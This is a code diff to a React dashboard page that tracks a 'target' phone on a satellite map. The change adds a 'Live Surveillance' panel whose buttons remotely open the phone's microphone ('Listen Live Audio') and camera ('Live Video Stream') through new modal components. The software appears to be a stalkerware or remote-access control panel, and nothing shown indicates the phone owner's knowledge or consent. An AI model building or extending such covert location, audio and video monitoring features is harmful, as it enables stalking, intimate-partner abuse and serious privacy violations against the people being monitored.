@@ -1,9 +1,11 @@
 import React, { useState, useEffect } from 'react';
 import { MapContainer, TileLayer, Marker, Popup, Circle, Polyline, Tooltip, useMap } from 'react-leaflet';
 import L from 'leaflet';
-import { Smartphone, RefreshCw, Navigation, Compass, Radio, Laptop, ArrowRightLeft, Crosshair, Satellite, ShieldCheck, MapPin } from 'lucide-react';
+import { Smartphone, RefreshCw, Navigation, Compass, Radio, Laptop, ArrowRightLeft, Crosshair, Satellite, ShieldCheck, MapPin, Phone, Video, Mic } from 'lucide-react';
 import { devicesApi, commandsApi, connectWebSocket } from '../services/api';
 import { Device } from '../types';
+import { VoiceCallModal } from '../components/VoiceCallModal';
+import { LiveCameraStreamModal } from '../components/LiveCameraStreamModal';
 
 // Custom Marker for Target Mobile Device (Exact Red GPS Satellite Target)
 const phoneRadarIcon = new L.DivIcon({
@@ -88,6 +90,8 @@ export const LiveLocationPage: React.FC = () => {
   const [mapTheme, setMapTheme] = useState<'satellite' | 'dark' | 'street'>('satellite');
   const [loading, setLoading] = useState(true);
   const [recenterTrigger, setRecenterTrigger] = useState(0);
+  const [activeVoiceDevice, setActiveVoiceDevice] = useState<Device | null>(null);
+  const [activeCameraDevice, setActiveCameraDevice] = useState<Device | null>(null);
 
   // 1. Browser Geolocation (only active when laptop range mode is explicitly enabled)
   useEffect(() => {
@@ -321,7 +325,7 @@ export const LiveLocationPage: React.FC = () => {
       {/* Cockpit HUD */}
       {rangeMode === 'device_only' ? (
         /* Single Device Pure Satellite HUD */
-        <div className="bg-slate-800/95 border border-cyan-500/40 rounded-2xl p-4 shadow-2xl backdrop-blur grid grid-cols-2 md:grid-cols-5 gap-3 items-center">
+        <div className="bg-slate-800/95 border border-cyan-500/40 rounded-2xl p-4 shadow-2xl backdrop-blur grid grid-cols-2 md:grid-cols-6 gap-2.5 items-center">
           <div className="bg-slate-900/70 p-2.5 rounded-xl border border-slate-700/60 text-center">
             <div className="text-[10px] text-cyan-400 font-extrabold uppercase tracking-wider flex items-center justify-center gap-1">
               <Smartphone className="w-3 h-3 text-cyan-400" />
@@ -373,15 +377,35 @@ export const LiveLocationPage: React.FC = () => {
             </div>
           </div>
 
+          {/* Quick Live Surveillance Action Stack */}
+          <div className="flex flex-col gap-1.5">
+            <button
+              onClick={() => selectedDevice && setActiveVoiceDevice(selectedDevice)}
+              className="py-1.5 px-2 bg-emerald-600/30 hover:bg-emerald-600/40 text-emerald-300 border border-emerald-500/40 font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all shadow-md shadow-emerald-600/10"
+              title="Listen live through phone microphone"
+            >
+              <Mic className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
+              <span>Listen Live Audio</span>
+            </button>
+            <button
+              onClick={() => selectedDevice && setActiveCameraDevice(selectedDevice)}
+              className="py-1.5 px-2 bg-rose-600/30 hover:bg-rose-600/40 text-rose-300 border border-rose-500/40 font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all shadow-md shadow-rose-600/10"
+              title="Open live camera stream"
+            >
+              <Video className="w-3.5 h-3.5 text-rose-400 animate-pulse" />
+              <span>Live Video Stream</span>
+            </button>
+          </div>
+
           <div className="col-span-2 md:col-span-1 flex flex-col gap-1.5">
             <a
               href={googleMapsUrl}
               target="_blank"
               rel="noopener noreferrer"
-              className="py-2.5 px-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white border border-cyan-400 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all shadow-lg shadow-cyan-600/20"
+              className="py-3 px-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white border border-cyan-400 font-bold rounded-xl text-xs flex items-center justify-center space-x-1.5 transition-all shadow-lg shadow-cyan-600/20"
             >
               <Navigation className="w-3.5 h-3.5" />
-              <span>Directions to Phone</span>
+              <span>Directions</span>
             </a>
           </div>
         </div>
@@ -635,9 +659,23 @@ export const LiveLocationPage: React.FC = () => {
             ))}
           </MapContainer>
         </div>
-
-
       </div>
+      
+      {/* Live Voice Microphone Intercom Modal */}
+      {activeVoiceDevice && (
+        <VoiceCallModal
+          device={activeVoiceDevice}
+          onClose={() => setActiveVoiceDevice(null)}
+        />
+      )}
+
+      {/* Live Camera Stream Modal */}
+      {activeCameraDevice && (
+        <LiveCameraStreamModal
+          device={activeCameraDevice}
+          onClose={() => setActiveCameraDevice(null)}
+        />
+      )}
     </div>
   );
 };
